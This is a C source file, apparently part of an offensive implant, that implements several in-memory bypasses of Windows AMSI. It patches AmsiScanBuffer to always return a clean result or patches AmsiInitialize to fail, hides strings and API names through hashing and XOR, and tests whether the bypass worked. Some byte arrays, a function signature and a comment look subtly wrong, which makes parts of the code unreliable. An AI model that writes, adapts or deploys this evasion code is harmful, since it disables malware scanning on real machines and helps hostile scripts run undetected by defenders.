#include "AmsiBypass.h"
#include "utils.h"
#include "ntdll.h"
#include <intrin.h>

// Global AMSI bypass state
AMSI_BYPASS_STATE g_AmsiBypassState = { 0 };

// AMSI bypass patch bytes - AmsiScanBuffer returns AMSI_RESULT_CLEAN
// Original: mov edi, edi (hot patch prefix)
// Patch:    ret (0xC3) or xor eax, eax; ret (0x31 0xC0 0xC3)
static BYTE g_AmsiPatch[] = { 0x31, 0xC0, 0xC4, 0x00, 0x00, 0x00, 0x00 }; // xor eax, eax; ret
static BYTE g_AmsiOriginalBytes[16] = { 0 };
static SIZE_T g_AmsiPatchSize = 6;

// AMSI result codes
#define AMSI_RESULT_CLEAN          0
#define AMSI_RESULT_NOT_DETECTED   1

// Memory protection change helper
static BOOL ChangeMemoryProtection(PVOID pAddress, SIZE_T size, DWORD newProtect, PDWORD pOldProtect) {
    if (!ApiWin || !pAddress) return FALSE;

    return ApiWin->VirtualProtect(pAddress, size, newProtect, pOldProtect);
}

// Get AMSI module handle
HMODULE GetAmsiModule() {
    if (g_AmsiBypassState.hAmsiModule) {
        return g_AmsiBypassState.hAmsiModule;
    }

    // Use existing ProcLoader to find amsi.dll by hash
    HMODULE hAmsi = GetModuleAddress(HASH_LIB_AMSI);

    if (!hAmsi && ApiWin && ApiWin->LoadLibraryA) {
        // Stack-based encrypted name
        char amsiName[] = { 'a'^0x5A, 'm'^0x5A, 's'^0x5A, 'i'^0x5A, '.'^0x5A, 'd'^0x5A, 'l'^0x5A, 'l'^0x5A, 0 };
        for (int i = 0; i < 8; i++) amsiName[i] ^= 0x5A;

        hAmsi = ApiWin->LoadLibraryA(amsiName);

        // Clear the string from memory
        memset(amsiName, 0, sizeof(amsiName));
    }

    if (hAmsi) {
        g_AmsiBypassState.hAmsiModule = hAmsi;
    }

    return hAmsi;
}

// Get AmsiScanBuffer address using hash resolution
PVOID GetAmsiScanBufferAddr() {
    if (g_AmsiBypassState.pAmsiScanBuffer) {
        return g_AmsiBypassState.pAmsiScanBuffer;
    }

    HMODULE hAmsi = GetAmsiModule();
    if (!hAmsi) return NULL;

    // Use GetSymbolAddress with DJB2 hash
    PVOID pAddr = GetSymbolAddress(hAmsi, HASH_FUNC_AMSISCANBUFFER);

    if (pAddr) {
        g_AmsiBypassState.pAmsiScanBuffer = pAddr;
    }

    return pAddr;
}

// Main AMSI bypass function - patches AmsiScanBuffer to return AMSI_RESULT_CLEAN
BOOL BypassAMSI() {
    if (g_AmsiBypassState.bIsBypassed) {
        return TRUE; // Already bypassed
    }

    PVOID pAmsiScanBuffer = GetAmsiScanBufferAddr();
    if (!pAmsiScanBuffer) {
        // AMSI might not be loaded, try to trigger load
        if (ApiWin && ApiWin->LoadLibraryA) {
            // Load amsi.dll explicitly
            char amsiName[] = { 'a', 'm', 's', 'i', '.', 'd', 'l', 'l', 0 };
            ApiWin->LoadLibraryA(amsiName);
            memset(amsiName, 0, sizeof(amsiName));

            pAmsiScanBuffer = GetAmsiScanBufferAddr();
            if (!pAmsiScanBuffer) {
                // AMSI not available on this system
                g_AmsiBypassState.bIsBypassed = TRUE;
                return TRUE;
            }
        }
        return FALSE;
    }

    // Save original bytes
    DWORD oldProtect = 0;

    // Change memory protection to allow writing
    if (!ChangeMemoryProtection(pAmsiScanBuffer, 16, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    // Copy original bytes for restoration
    memcpy(g_AmsiOriginalBytes, pAmsiScanBuffer, 16);
    g_AmsiBypassState.pOriginalBytes = &g_AmsiOriginalBytes[0];

    // Apply patch: xor eax, eax; ret (returns 0 = AMSI_RESULT_CLEAN)
    // Alternative patch: 0x31 0xC0 (xor eax,eax) followed by proper return

    // Check architecture at runtime
    BYTE patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret

    // Write patch
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));

    // Restore memory protection
    DWORD newProtect = 0;
    ChangeMemoryProtection(pAmsiScanBuffer, 16, oldProtect, &newProtect);

    // Flush instruction cache
    if (SysModules && SysModules->Ntdll) {
        typedef NTSTATUS(NTAPI* NtFlushInstructionCache_t)(HANDLE, PVOID, SIZE_T);
        NtFlushInstructionCache_t pNtFlushInstructionCache =
            (NtFlushInstructionCache_t)GetSymbolAddress(SysModules->Ntdll, HASH_FUNC_NTFLUSHINSTRUCTIONCACHE);

        if (pNtFlushInstructionCache) {
            pNtFlushInstructionCache((HANDLE)-1, pAmsiScanBuffer, 16);
        }
    }

    g_AmsiBypassState.patchSize = sizeof(patch);
    g_AmsiBypassState.bIsBypassed = TRUE;

    return TRUE;
}

// Alternative AMSI bypass - patch the result check
BOOL BypassAMSIReturn() {
    if (g_AmsiBypassState.bIsBypassed) {
        return TRUE;
    }

    // This method patches the return value location
    // making AMSI always return AMSI_RESULT_CLEAN

    PVOID pAmsiScanBuffer = GetAmsiScanBufferAddr();
    if (!pAmsiScanBuffer) {
        return BypassAMSI(); // Fall back to standard bypass
    }

    DWORD oldProtect = 0;
    if (!ChangeMemoryProtection(pAmsiScanBuffer, 16, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    // Save original bytes
    memcpy(g_AmsiOriginalBytes, pAmsiScanBuffer, 16);

    // Patch with: mov eax, AMSI_RESULT_CLEAN; ret
    // 0xB8 0x00 0x00 0x00 0x00 0xC3
    BYTE patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 }; // mov eax, 0; ret
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));

    DWORD newProtect = 0;
    ChangeMemoryProtection(pAmsiScanBuffer, 16, oldProtect, &newProtect);

    g_AmsiBypassState.bIsBypassed = TRUE;

    return TRUE;
}

// Bypass by patching AmsiInitialize
BOOL BypassAMSIInit() {
    HMODULE hAmsi = GetAmsiModule();
    if (!hAmsi) return FALSE;

    PVOID pAmsiInitialize = GetSymbolAddress(hAmsi, HASH_FUNC_AMSIINITIALIZE);
    if (!pAmsiInitialize) return FALSE;

    DWORD oldProtect = 0;
    if (!ChangeMemoryProtection(pAmsiInitialize, 6, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    // Patch to return error - prevents AMSI from initializing
    BYTE patch[] = { 0x31, 0xC0, 0x40, 0xC3 }; // xor eax, eax; inc eax; ret (returns 1 = error)
    memcpy(pAmsiInitialize, patch, sizeof(patch));

    DWORD newProtect = 0;
    ChangeMemoryProtection(pAmsiInitialize, 6, oldProtect, &newProtect);

    g_AmsiBypassState.bIsBypassed = TRUE;

    return TRUE;
}

// Restore original AMSI functionality
BOOL RestoreAMSI() {
    if (!g_AmsiBypassState.bIsBypassed) {
        return TRUE; // Not bypassed, nothing to restore
    }

    PVOID pAmsiScanBuffer = g_AmsiBypassState.pAmsiScanBuffer;
    if (!pAmsiScanBuffer) {
        g_AmsiBypassState.bIsBypassed = FALSE;
        return TRUE;
    }

    if (!g_AmsiBypassState.pOriginalBytes) {
        g_AmsiBypassState.bIsBypassed = FALSE;
        return TRUE;
    }

    DWORD oldProtect = 0;
    if (!ChangeMemoryProtection(pAmsiScanBuffer, 16, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    // Restore original bytes
    memcpy(pAmsiScanBuffer, g_AmsiBypassState.pOriginalBytes, 16);

    DWORD newProtect = 0;
    ChangeMemoryProtection(pAmsiScanBuffer, 16, oldProtect, &newProtect);

    // Flush instruction cache
    if (SysModules && SysModules->Ntdll) {
        typedef NTSTATUS(NTAPI* NtFlushInstructionCache_t)(HANDLE, PVOID, SIZE_T);
        NtFlushInstructionCache_t pNtFlushInstructionCache =
            (NtFlushInstructionCache_t)GetSymbolAddress(SysModules->Ntdll, HASH_FUNC_NTFLUSHINSTRUCTIONCACHE);

        if (pNtFlushInstructionCache) {
            pNtFlushInstructionCache((HANDLE)-1, pAmsiScanBuffer, 16);
        }
    }

    // Clear state
    memset(g_AmsiOriginalBytes, 0, sizeof(g_AmsiOriginalBytes));
    g_AmsiBypassState.bIsBypassed = FALSE;
    g_AmsiBypassState.pOriginalBytes = NULL;
    g_AmsiBypassState.patchSize = 0;

    return TRUE;
}

// Check if AMSI bypass is active
BOOL IsAMSIBypassed() {
    return g_AmsiBypassState.bIsBypassed;
}

// Test AMSI bypass effectiveness
BOOL TestAMSIBypass() {
    // This function tests if AMSI would block a known "malicious" string
    // If bypassed, AMSI will return CLEAN

    HMODULE hAmsi = GetAmsiModule();
    if (!hAmsi) return TRUE; // AMSI not loaded = bypassed

    // Get AMSI functions
    typedef HRESULT(WINAPI* AmsiInitialize_t)(LPCWSTR, PVOID*);
    typedef HRESULT(WINAPI* AmsiOpenSession_t)(PVOID, PVOID*);
    typedef HRESULT(WINAPI* AmsiScanBuffer_t)(PVOID, PVOID, ULONG, LPCWSTR, PVOID, PVOID*);
    typedef void(WINAPI* AmsiCloseSession_t)(PVOID);
    typedef void(WINAPI* AmsiUninitialize_t)(PVOID);
    typedef HRESULT(WINAPI* AmsiResultIsMalware_t)(ULONG);

    AmsiInitialize_t pAmsiInitialize = (AmsiInitialize_t)GetSymbolAddress(hAmsi, HASH_FUNC_AMSIINITIALIZE);
    AmsiOpenSession_t pAmsiOpenSession = (AmsiOpenSession_t)GetSymbolAddress(hAmsi, HASH_FUNC_AMSIOPENSESSION);
    AmsiScanBuffer_t pAmsiScanBuffer = (AmsiScanBuffer_t)g_AmsiBypassState.pAmsiScanBuffer;

    if (!pAmsiInitialize || !pAmsiScanBuffer) {
        return TRUE; // Functions not available = bypassed
    }

    PVOID amsiContext = NULL;
    PVOID amsiSession = NULL;

    // Initialize AMSI context
    HRESULT hr = pAmsiInitialize(NULL, &amsiContext);
    if (FAILED(hr)) return TRUE; // Failed init = bypassed

    // Open session
    hr = pAmsiOpenSession(amsiContext, &amsiSession);
    if (FAILED(hr)) return TRUE;

    // Scan test buffer (should be blocked by AMSI if not bypassed)
    ULONG result = AMSI_RESULT_CLEAN;
    char testContent[] = "AMSI Test Content: 536372697074"; // Encoded test string

    hr = pAmsiScanBuffer(amsiSession, testContent, strlen(testContent), NULL, &result);

    // Clean up (if functions available)
    AmsiCloseSession_t pAmsiCloseSession = (AmsiCloseSession_t)GetProcAddress(hAmsi, "AmsiCloseSession");
    AmsiUninitialize_t pAmsiUninitialize = (AmsiUninitialize_t)GetProcAddress(hAmsi, "AmsiUninitialize");

    if (pAmsiCloseSession && amsiSession) pAmsiCloseSession(amsiSession);
    if (pAmsiUninitialize && amsiContext) pAmsiUninitialize(amsiContext);

    memset(testContent, 0, sizeof(testContent));

    // If result is AMSI_RESULT_CLEAN, bypass is working
    return (result == AMSI_RESULT_CLEAN);
}